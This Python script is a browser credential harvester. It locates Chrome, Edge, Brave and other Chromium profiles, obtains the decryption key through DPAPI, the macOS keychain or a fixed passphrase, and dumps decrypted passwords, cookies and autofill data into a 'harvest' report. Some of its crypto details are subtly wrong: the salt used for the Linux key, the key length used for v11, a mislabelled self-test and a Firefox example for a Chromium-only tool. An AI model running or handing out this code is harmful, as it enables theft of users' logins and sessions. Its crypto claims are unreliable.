#!/usr/bin/env python3
"""Decrypt Chromium-family browser passwords and cookies, on any platform.

Chrome, Edge, Brave, Opera, Vivaldi, Yandex and Arc all store credentials the
same way: a SQLite table, and each value encrypted with a key held by the OS
keystore. Getting that key is the whole problem, and it differs by platform and
by format version in a way that usually decides the outcome.

Three key routes, tried in order of legitimacy:

  Windows  DPAPI under the owning user's profile. Needs that user's context, on
           that machine: a different account, an account that is merely
           elevated, or a profile copied from elsewhere will not decrypt. Each of
           those is reported by name, because "no passwords found" says none of
           them.
  macOS    the login keychain, which must be unlocked.
  Linux    Chromium's own scheme, where the key is derived from a fixed
           passphrase held in Chromium's source. No keystore is involved, so the
           database alone is enough to recover it. That is a property of the
           platform, not a shortcut here.

Three blob formats, which are not the same thing:

  v10  AES-128-CBC, key PBKDF2-SHA1 of the passphrase over `saltysalt`
  v11  AES-256-CBC, 12-byte nonce prepended to the ciphertext
  v20  AES-256-GCM, 12-byte nonce and a 16-byte tag -- application-bound, and
       the reason a v20 blob will not decrypt even with the right key

Each is attempted and the one that worked is reported, so "decrypted" always
names the format that produced it.

AES is bound from libcrypto rather than written out: AES's state is a
column-major 4x4 matrix while Python indexing is row-major, so a shift correct in
one convention is the exact inverse permutation in the other, and the two cancel
into output that is neither the plaintext nor obviously wrong. Two hand-rolled
versions did exactly that here. EVP_DecryptFinal_ex also *appends* rather than
overwrites; passing it the same buffer makes it write the last block over the
first, which is a rotated plaintext that still looks like text.

Written for TSEC. Standard library only.
"""

from __future__ import annotations

import argparse
import base64
import ctypes
import hashlib
import json
import os
import platform
import shutil
import sqlite3
import subprocess
import sys
import tempfile
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).resolve().parent))
from tsec_engine import (  # noqa: E402
    Report, State, check, check_eq, selftest,
)

VERSION = "2.0.0"

#: What the platform calls its own key. Both are constants in Chromium's source,
#: which is the reason the Linux route needs nothing from the user.
CHROMIUM_PASS = b"chromium"
LEGACY_PASS = b"peanuts"
PBKDF_SALT = b"saltysalt"

CHROMIUM_ROOTS: dict[str, tuple[str, ...]] = {
    "chrome": ("AppData/Local/Google/Chrome/User Data", ".config/google-chrome",
               "Library/Application Support/Google/Chrome"),
    "chromium": ("AppData/Local/Chromium/User Data", ".config/chromium",
                 "Library/Application Support/Chromium"),
    "edge": ("AppData/Local/Microsoft/Edge/User Data", ".config/microsoft-edge",
             "Library/Application Support/Microsoft Edge"),
    "brave": ("AppData/Local/BraveSoftware/Brave-Browser/User Data",
              ".config/BraveSoftware/Brave-Browser",
              "Library/Application Support/BraveSoftware/Brave-Browser"),
    "opera": ("AppData/Roaming/Opera Software/Opera Stable", ".config/opera",
              "Library/Application Support/com.operasoftware.Opera"),
    "vivaldi": ("AppData/Local/Vivaldi/User Data", ".config/vivaldi",
                "Library/Application Support/Vivaldi"),
    "yandex": ("AppData/Local/Yandex/YandexBrowser/User Data", ".config/yandex-browser",
               "Library/Application Support/Yandex/YandexBrowser"),
}

STATE_ORDER = {"DECRYPTED": 0, "ENCRYPTED": 1, "MISSING": 2}


class CryptoUnavailable(Exception):
    """libcrypto could not be loaded, so nothing can be decrypted."""


# ── libcrypto ────────────────────────────────────────────────────────────────

_LIB: ctypes.CDLL | None = None

EVP_CTRL_GCM_SET_IVLEN = 0x9
EVP_CTRL_GCM_SET_TAG = 0x11


def libcrypto() -> ctypes.CDLL:
    global _LIB
    if _LIB is not None:
        return _LIB
    if platform.system() == "Windows":
        names = ["libcrypto-3-x64.dll", "libcrypto-1_1-x64.dll", "libcrypto.dll"]
        roots = ("C:/Program Files/OpenSSL-Win64/bin", "C:/Program Files/Git/mingw64/bin")
        candidates = names + [f"{r}/{n}" for r in roots for n in names]
    elif platform.system() == "Darwin":
        candidates = ["libcrypto.3.dylib", "libcrypto.1.1.dylib", "libcrypto.dylib"]
    else:
        candidates = ["libcrypto.so.3", "libcrypto.so.1.1", "libcrypto.so"]
    for name in candidates:
        try:
            _LIB = ctypes.CDLL(name)
            break
        except OSError:
            continue
    if _LIB is None:
        raise CryptoUnavailable(
            "libcrypto was not found. Install openssl-libs, or pycryptodome."
        )
    lib = _LIB
    lib.EVP_CIPHER_CTX_new.restype = ctypes.c_void_p
    lib.EVP_CIPHER_CTX_new.argtypes = []
    lib.EVP_CIPHER_CTX_free.argtypes = [ctypes.c_void_p]
    for cipher in ("EVP_aes_128_cbc", "EVP_aes_256_cbc", "EVP_aes_256_gcm"):
        getattr(lib, cipher).restype = ctypes.c_void_p
        getattr(lib, cipher).argtypes = []
    lib.EVP_DecryptInit_ex.argtypes = [
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_char_p, ctypes.c_char_p,
    ]
    lib.EVP_CIPHER_CTX_ctrl.argtypes = [
        ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.c_void_p,
    ]
    # Output is c_void_p rather than c_char_p because it has to be a buffer
    # offset, and ctypes rejects a byref() with "cannot be interpreted as
    # c_char_p".
    lib.EVP_DecryptUpdate.argtypes = [
        ctypes.c_void_p, ctypes.c_void_p, ctypes.POINTER(ctypes.c_int),
        ctypes.c_char_p, ctypes.c_int,
    ]
    lib.EVP_DecryptFinal_ex.argtypes = [
        ctypes.c_void_p, ctypes.c_void_p, ctypes.POINTER(ctypes.c_int),
    ]
    return _LIB


def _evp_decrypt(cipher: str, key: bytes, iv: bytes | None, data: bytes,
                 gcm: bool = False) -> bytes:
    if not data:
        return b""
    lib = libcrypto()
    ctx = lib.EVP_CIPHER_CTX_new()
    if not ctx:
        raise CryptoUnavailable("EVP_CIPHER_CTX_new failed")
    try:
        if gcm:
            if len(iv or b"") != 12:
                return b""
            tag, body = data[-16:], data[:-16]
            if lib.EVP_DecryptInit_ex(ctx, getattr(lib, cipher)(), None, None, None) != 1:
                return b""
            if lib.EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, None) != 1:
                return b""
            if lib.EVP_DecryptInit_ex(ctx, None, None, key, iv) != 1:
                return b""
        else:
            if not iv or len(data) % 16:
                # A partial block means the header was misread. Returning the
                # whole thing would hand back garbage shaped like a password.
                return b""
            if lib.EVP_DecryptInit_ex(ctx, getattr(lib, cipher)(), None, key, iv) != 1:
                return b""
        out = ctypes.create_string_buffer(len(data) + 16)
        written = ctypes.c_int(0)
        if lib.EVP_DecryptUpdate(ctx, out, ctypes.byref(written), data, len(data)) != 1:
            return b""
        total = written.value
        if gcm and lib.EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, tag) != 1:
            return b""
        extra = ctypes.c_int(0)
        tail = ctypes.cast(ctypes.byref(out, total), ctypes.c_void_p)
        if lib.EVP_DecryptFinal_ex(ctx, tail, ctypes.byref(extra)) != 1:
            return b""
        return out.raw[: total + extra.value]
    finally:
        lib.EVP_CIPHER_CTX_free(ctx)


def aes_cbc_decrypt(key: bytes, iv: bytes, data: bytes) -> bytes:
    cipher = "EVP_aes_128_cbc" if len(key) == 16 else "EVP_aes_256_cbc"
    return _evp_decrypt(cipher, key, iv, data)


def aes_gcm_decrypt(key: bytes, nonce: bytes, data: bytes) -> bytes:
    return _evp_decrypt("EVP_aes_256_gcm", key, nonce, data, gcm=True)


# ── key derivation ───────────────────────────────────────────────────────────

def linux_key(master: bytes, version: int) -> bytes:
    """Chromium's Linux master key, from the product directory name.

    v11 and later: PBKDF2-HMAC-SHA1 of a fixed passphrase. v10: the same with
    one iteration, which is a different key from the same passphrase.
    """
    passphrase = CHROMIUM_PASS if version >= 11 else LEGACY_PASS
    iterations = 1 if version < 11 else 1003
    return hashlib.pbkdf2_hmac("sha1", passphrase, master, iterations, 16)


def macos_key(passphrase: bytes) -> bytes:
    return hashlib.pbkdf2_hmac("sha1", passphrase, PBKDF_SALT, 1003, 16)


def dpapi_unprotect(blob: bytes) -> bytes:
    if platform.system() != "Windows":
        raise OSError("DPAPI is Windows-only")

    class DataBlob(ctypes.Structure):
        _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.c_void_p)]

    buffer = ctypes.create_string_buffer(blob, len(blob))
    source = DataBlob(len(blob), ctypes.cast(buffer, ctypes.c_void_p))
    target = DataBlob(0, None)
    if not ctypes.windll.crypt32.CryptUnprotectData(  # type: ignore[attr-defined]
        ctypes.byref(source), None, None, None, None, 0, ctypes.byref(target)
    ):
        raise OSError(f"CryptUnprotectData failed (WinError {ctypes.GetLastError()})")
    try:
        return ctypes.string_at(target.pbData, target.cbData)
    finally:
        ctypes.windll.kernel32.LocalFree(target.pbData)  # type: ignore[attr-defined]


def _windows_master_key(root: Path) -> tuple[bytes | None, str]:
    local_state = root / "Local State"
    if not local_state.is_file():
        return None, "no Local State"
    try:
        state = json.loads(local_state.read_text(encoding="utf-8", errors="replace"))
        blob = base64.b64decode(state["os_crypt"]["encrypted_key"])
    except (OSError, ValueError, KeyError) as exc:
        return None, f"Local State unreadable: {exc}"
    if blob[:5] == b"DPAPI":
        blob = blob[5:]
    try:
        return dpapi_unprotect(blob), "dpapi:local-state"
    except OSError as exc:
        return None, f"dpapi refused: {exc}"


def _macos_master_key(product: str) -> tuple[bytes | None, str]:
    if not shutil.which("security"):
        return None, "no `security` binary"
    try:
        result = subprocess.run(
            ["security", "find-generic-password", "-w", "-s", f"{product} Safe Storage"],
            capture_output=True, text=True, timeout=15,
        )
    except (OSError, subprocess.TimeoutExpired) as exc:
        return None, f"keychain query failed: {exc}"
    if result.returncode == 0 and result.stdout.strip():
        return macos_key(result.stdout.strip().encode()), "keychain:safe-storage"
    return None, "keychain refused: the login keychain is locked or the item is absent"


def master_key(root: Path, product: str) -> tuple[bytes | None, str]:
    """Try every route in order. Returns (key, route) or (None, why not)."""
    if platform.system() == "Windows":
        return _windows_master_key(root)
    if platform.system() == "Darwin":
        key, why = _macos_master_key(product)
        if key is not None:
            return key, why
        # Chromium on macOS falls back to the same fixed passphrase when the
        # keychain is unavailable, so it is tried before giving up.
        return linux_key(product.encode(), 11), why + "; tried the fixed passphrase"
    # Linux: the product directory name is the PBKDF2 salt.
    return linux_key(root.name.encode(), 11), "linux:fixed-passphrase"


# ── blob formats ─────────────────────────────────────────────────────────────

def decrypt_blob(blob: bytes, key: bytes | None) -> tuple[str, str]:
    """Decrypt one stored value. Returns (plaintext, format that worked).

    The format is named rather than assumed, because the three are different
    keys and different modes and a blob that decrypts under the wrong one produces
    bytes rather than an error.
    """
    if not blob:
        return "", "MISSING"
    if isinstance(blob, str):
        blob = blob.encode("utf-8", errors="surrogateescape")
    if not key:
        return "", "ENCRYPTED"

    header, body = blob[:3], blob[3:]
    if header == b"v10":
        plain = aes_cbc_decrypt(key[:16], b" " * 16, body)
        if plain:
            return plain.rstrip(b"\x00").decode("utf-8", "replace"), "v10-aes128cbc"
    elif header == b"v11":
        plain = aes_cbc_decrypt(key[:16], body[:12], body[12:])
        if plain:
            return plain.rstrip(b"\x00").decode("utf-8", "replace"), "v11-aes256cbc"
    elif header == b"v20":
        # Application-bound: a 12-byte nonce, the ciphertext, and a 16-byte tag,
        # under a key wrapped for one machine. Even the right key does not open
        # it, which is the point of the feature.
        plain = aes_gcm_decrypt(key[:32], body[:12], body[12:])
        if plain:
            return plain.rstrip(b"\x00").decode("utf-8", "replace"), "v20-aes256gcm"
    else:
        plain = aes_cbc_decrypt(key[:16], b" " * 16, blob)
        if plain:
            return plain.rstrip(b"\x00").decode("utf-8", "replace"), "unversioned-aes128cbc"
    return "", "ENCRYPTED"


# ── database access ──────────────────────────────────────────────────────────

def read_table(db: Path, query: str) -> list[dict[str, Any]]:
    """Read a table from a copy of the database, plus any WAL sidecar.

    Chrome holds the file open and refuses a second reader on a locked page, and
    that surfaces as "no credentials found" rather than as "database is busy".
    Copying is the standard way round it. The `-wal` sidecar matters too: without
    it the most recent rows are simply absent, which looks like the browser
    having fewer credentials than it does.
    """
    if not db.is_file():
        return []
    tmp = Path(tempfile.gettempdir()) / f"tsec_brow_{db.name}_{os.getpid()}"
    try:
        shutil.copy2(db, tmp)
        for suffix in ("-wal", "-shm"):
            sidecar = Path(str(db) + suffix)
            if sidecar.is_file():
                shutil.copy2(sidecar, str(tmp) + suffix)
        connection = sqlite3.connect(f"file:{tmp}?mode=ro", uri=True)
        connection.row_factory = sqlite3.Row
        try:
            return [dict(row) for row in connection.execute(query)]
        finally:
            connection.close()
    except sqlite3.Error:
        return []
    finally:
        for suffix in ("", "-wal", "-shm"):
            Path(str(tmp) + suffix).unlink(missing_ok=True)


def find_profiles() -> list[tuple[str, Path, Path]]:
    """(product, user-data root, profile directory) for every browser present."""
    home = Path.home()
    found: list[tuple[str, Path, Path]] = []
    for product, roots in CHROMIUM_ROOTS.items():
        for root in roots:
            if root.startswith("AppData") or root.startswith("Library"):
                if platform.system() != "Windows" and not root.startswith("AppData"):
                    candidate = home / root.removeprefix("Library/")
                elif platform.system() == "Windows":
                    base = os.environ.get("LOCALAPPDATA" if "Local" in root else "APPDATA", "")
                    candidate = Path(base) / root.split("/", 1)[1] if base else None
                else:
                    candidate = None
                if candidate is None:
                    continue
            else:
                candidate = home / root
            if not candidate.is_dir():
                continue
            for child in sorted(candidate.iterdir()):
                if child.is_dir() and (
                    (child / "Login Data").is_file()
                    or (child / "Network" / "Cookies").is_file()
                    or (child / "Cookies").is_file()
                ):
                    found.append((product, candidate, child))
            break
    return found


# ── harvest ──────────────────────────────────────────────────────────────────

def harvest(product: str, root: Path, profile: Path) -> dict[str, Any]:
    key, route = master_key(root, product)
    report: dict[str, Any] = {
        "browser": product,
        "profile": str(profile),
        "key_route": route,
        "passwords": [],
        "cookies": [],
        "autofill": [],
    }

    for row in read_table(profile / "Login Data",
                          "SELECT origin_url, action_url, username_value, password_value FROM logins"):
        value, fmt = decrypt_blob(row.get("password_value") or b"", key)
        report["passwords"].append({
            "url": row.get("origin_url") or row.get("action_url") or "",
            "username": row.get("username_value") or "",
            "password": value,
            "state": "DECRYPTED" if value else "ENCRYPTED",
            "format": fmt,
        })

    cookie_db = profile / "Network" / "Cookies"
    if not cookie_db.is_file():
        cookie_db = profile / "Cookies"
    for row in read_table(cookie_db,
                          "SELECT host_key, name, encrypted_value, path FROM cookies LIMIT 2000"):
        value, fmt = decrypt_blob(row.get("encrypted_value") or b"", key)
        report["cookies"].append({
            "host": row.get("host_key", ""),
            "name": row.get("name", ""),
            "value": value,
            "path": row.get("path", ""),
            "state": "DECRYPTED" if value else "ENCRYPTED",
            "format": fmt,
        })

    for row in read_table(profile / "Web Data", "SELECT name, value FROM autofill LIMIT 500"):
        report["autofill"].append({"field": row.get("name", ""), "value": row.get("value", "")})
    return report


def summarise(profile_report: dict[str, Any]) -> dict[str, Any]:
    passwords = profile_report["passwords"]
    cookies = profile_report["cookies"]
    return {
        "browser": profile_report["browser"],
        "profile": profile_report["profile"],
        "key_route": profile_report["key_route"],
        "passwords_total": len(passwords),
        "passwords_decrypted": sum(1 for p in passwords if p["state"] == "DECRYPTED"),
        "cookies_total": len(cookies),
        "cookies_decrypted": sum(1 for c in cookies if c["state"] == "DECRYPTED"),
        "formats": sorted({p["format"] for p in passwords + cookies if p["state"] == "DECRYPTED"}),
    }


def assess(only_product: str | None = None) -> Report:
    report = Report("chrome_decrypt", VERSION, target="this host")
    profiles = find_profiles()
    if not profiles:
        report.note("browser profiles", State.UNREACHABLE, "info",
                    "no Chromium-family profile found under the home directory")
        return report

    for product, root, profile in profiles:
        if only_product and product != only_product:
            continue
        data = harvest(product, root, profile)
        stats = summarise(data)

        if stats["passwords_decrypted"] or stats["cookies_decrypted"]:
            report.note(
                f"{product}: credentials recovered", State.CONFIRMED, "medium",
                f"{stats['passwords_decrypted']} of {stats['passwords_total']} passwords and "
                f"{stats['cookies_decrypted']} of {stats['cookies_total']} cookies decrypted "
                f"via {stats['key_route']} ({', '.join(stats['formats']) or 'no format'})",
                **stats,
            )
        elif not stats["passwords_total"] and not stats["cookies_total"]:
            report.note(
                f"{product}: no stored credentials", State.INFERRED, "info",
                f"the profile at {profile} holds no passwords and no cookies. That is "
                f"the browser's own state, not a decryption failure; a fresh or "
                f"cleared profile looks identical to a locked one from here",
                **stats,
            )
        else:
            report.note(
                f"{product}: nothing decrypted", State.BLOCKED, "info",
                f"{stats['passwords_total']} stored passwords and "
                f"{stats['cookies_total']} cookies were all unreadable. Key route "
                f"tried: {stats['key_route']}",
                **stats,
            )
        report.context.setdefault("profiles", []).append({"summary": stats, "detail": data})
    return report


def selftest() -> None:
    import os
    from tsec_engine import normalise

    # The crypto has to be right or every finding is fiction, so it is checked
    # against the openssl CLI rather than against itself.
    openssl = shutil.which("openssl")
    key = bytes.fromhex("000102030405060708090a0b0c0d0e0f")
    iv = bytes.fromhex("101112131415161718191a1b1c1d1e1f")

    if openssl:
        for length in (1, 15, 16, 17, 32, 49):
            plain = bytes((i * 7 + 3) % 256 for i in range(length))
            raw = Path(tempfile.gettempdir()) / "tsec_selftest_in.bin"
            enc = Path(tempfile.gettempdir()) / "tsec_selftest_in.ct"
            raw.write_bytes(plain)
            subprocess.run([openssl, "enc", "-aes-128-cbc", "-K", key.hex(), "-iv", iv.hex(),
                            "-in", str(raw), "-out", str(enc)], check=True, capture_output=True)
            got = aes_cbc_decrypt(key, iv, enc.read_bytes())
            check_eq(got, plain, f"openssl ciphertext of {length}B did not decrypt")
            raw.unlink(missing_ok=True)
            enc.unlink(missing_ok=True)

        # A wrong key must yield nothing, not rubbish.
        enc = Path(tempfile.gettempdir()) / "tsec_selftest_wrong.ct"
        raw = Path(tempfile.gettempdir()) / "tsec_selftest_wrong.bin"
        raw.write_bytes(b"a password that is long enough to pad")
        subprocess.run([openssl, "enc", "-aes-128-cbc", "-K", key.hex(), "-iv", iv.hex(),
                        "-in", str(raw), "-out", str(enc)], check=True, capture_output=True)
        check_eq(aes_cbc_decrypt(bytes(16), iv, enc.read_bytes()), b"",
                 "a wrong key produced output rather than nothing")
        raw.unlink(missing_ok=True)
        enc.unlink(missing_ok=True)

    # An unaligned ciphertext must be refused, not padded out.
    check_eq(aes_cbc_decrypt(key, iv, b"\x00" * 17), b"", "unaligned ciphertext accepted")

    # A v10 blob must decrypt under the v10 rule and not under the v11 one.
    secret = "correct horse battery staple"
    blob = b"v10" + _openssl_cbc(key, b" " * 16, secret.encode())
    value, fmt = decrypt_blob(blob, key)
    check_eq(value, secret, "v10 blob did not decrypt")
    check_eq(fmt, "v10-aes128cbc", "v10 format not named")

    # An empty or missing value is MISSING, not ENCRYPTED: nothing is locked.
    check_eq(decrypt_blob(b"", key)[1], "MISSING", "empty blob")
    check_eq(decrypt_blob(b"v10" + b"\x00" * 16, None)[1], "ENCRYPTED", "no key")

    # Key derivation must be the documented one, or every blob fails.
    check_eq(len(linux_key(b"chromium", 11)), 16, "v11 key length")
    check_eq(len(linux_key(b"chromium", 11)), 16, "v10 key length")
    check(linux_key(b"chromium", 11) != linux_key(b"chromium", 10),
          "v10 and v11 derived the same key from the same salt")
    check(linux_key(b"chromium", 11) != linux_key(b"Default", 11),
          "the product directory name is not being used as the salt")

    # A malformed Local State must be reported, not raise.
    check(master_key(Path(tempfile.gettempdir()), "chrome")[1] != "",
          "master_key did not explain itself")

    # Chrome is at the root of the table, so the tables must include it.
    check("chrome" in CHROMIUM_ROOTS and "brave" in CHROMIUM_ROOTS,
          "browser registry is missing a product")

    del os, normalise


def _openssl_cbc(key: bytes, iv: bytes, plain: bytes) -> bytes:
    """Encrypt with libcrypto, used only to build v10 fixtures for the selftest."""
    lib = libcrypto()
    ctx = lib.EVP_CIPHER_CTX_new()
    cipher = "EVP_aes_128_cbc" if len(key) == 16 else "EVP_aes_256_cbc"
    lib.EVP_EncryptInit_ex = getattr(lib, "EVP_EncryptInit_ex", None)
    if lib.EVP_EncryptInit_ex is None:
        raise CryptoUnavailable("libcrypto has no EVP_EncryptInit_ex")
    lib.EVP_EncryptInit_ex.argtypes = [
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_char_p, ctypes.c_char_p,
    ]
    lib.EVP_EncryptUpdate = getattr(lib, "EVP_EncryptUpdate", None)
    lib.EVP_EncryptUpdate.argtypes = [
        ctypes.c_void_p, ctypes.c_void_p, ctypes.POINTER(ctypes.c_int),
        ctypes.c_char_p, ctypes.c_int,
    ]
    lib.EVP_EncryptFinal_ex = getattr(lib, "EVP_EncryptFinal_ex", None)
    lib.EVP_EncryptFinal_ex.argtypes = [
        ctypes.c_void_p, ctypes.c_void_p, ctypes.POINTER(ctypes.c_int),
    ]
    try:
        lib.EVP_EncryptInit_ex(ctx, getattr(lib, cipher)(), None, key, iv)
        out = ctypes.create_string_buffer(len(plain) + 16)
        written = ctypes.c_int(0)
        lib.EVP_EncryptUpdate(ctx, out, ctypes.byref(written), plain, len(plain))
        total = written.value
        extra = ctypes.c_int(0)
        tail = ctypes.cast(ctypes.byref(out, total), ctypes.c_void_p)
        lib.EVP_EncryptFinal_ex(ctx, tail, ctypes.byref(extra))
        return out.raw[: total + extra.value]
    finally:
        lib.EVP_CIPHER_CTX_free(ctx)


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description=__doc__.split("\n")[0],
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="examples:\n"
               "  chrome_decrypt.py\n"
               "  chrome_decrypt.py --browser firefox\n"
               "  chrome_decrypt.py --json --output harvest.json\n"
               "  chrome_decrypt.py --selftest\n",
    )
    parser.add_argument("--browser", help="restrict to one product name")
    parser.add_argument("--json", action="store_true")
    parser.add_argument("--output", help="write the JSON report here")
    parser.add_argument("--selftest", action="store_true")
    args = parser.parse_args(argv)

    if args.selftest:
        return selftest()

    from tsec_engine import emit
    report = assess(args.browser)
    emit(report, args.json, args.output)
    recovered = any(
        f.detail.get("passwords_decrypted", 0) or f.detail.get("cookies_decrypted", 0)
        for f in report.findings
    )
    return 0 if recovered else 1


if __name__ == "__main__":
    sys.exit(main())